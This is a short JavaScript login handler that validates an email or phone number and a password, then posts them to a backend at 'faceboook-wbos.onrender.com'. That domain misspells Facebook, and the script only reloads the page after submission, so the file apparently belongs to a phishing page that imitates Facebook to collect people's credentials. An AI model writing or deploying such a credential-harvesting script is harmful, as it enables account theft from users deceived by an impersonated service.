document.getElementById("login").addEventListener("click", async function () {

    
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const errorMessage = document.getElementById("error-message");

    if (!email || !password) {
        errorMessage.style.display = "block";
        errorMessage.textContent = "🛑 Please fill in both email and password fields.";
        return;
    }

    errorMessage.style.display = "none"; 


    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phonePattern = /^[6-9]\d{9}$/;

    if (!emailPattern.test(email) && !phonePattern.test(email)) {
        const message = document.getElementById("login-message");

        errorMessage.style.display = "block";
        errorMessage.textContent = "Please enter a valid email or phone number.";

        setTimeout(() => {
            message.textContent = "";
        }, 3000);

        return;  
    }
    errorMessage.style.display = "none"; 

    
    const loginData = {
        username: email,
        password: password
    };
    let backend_url;
    if (window.location.hostname === "127.0.0.1" || window.location.hostname === "localhost") {
        backend_url = "http://127.0.0.1:8000/login";
    } else {
        backend_url = "https://faceboook-wbos.onrender.com/login";
    }

    try {

        const response = await fetch(backend_url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(loginData)
        });

        const result = await response.json();
        if (response.ok) {
            location.reload();
        }
    } catch (error) {
        console.error("Error:", error);
    }
});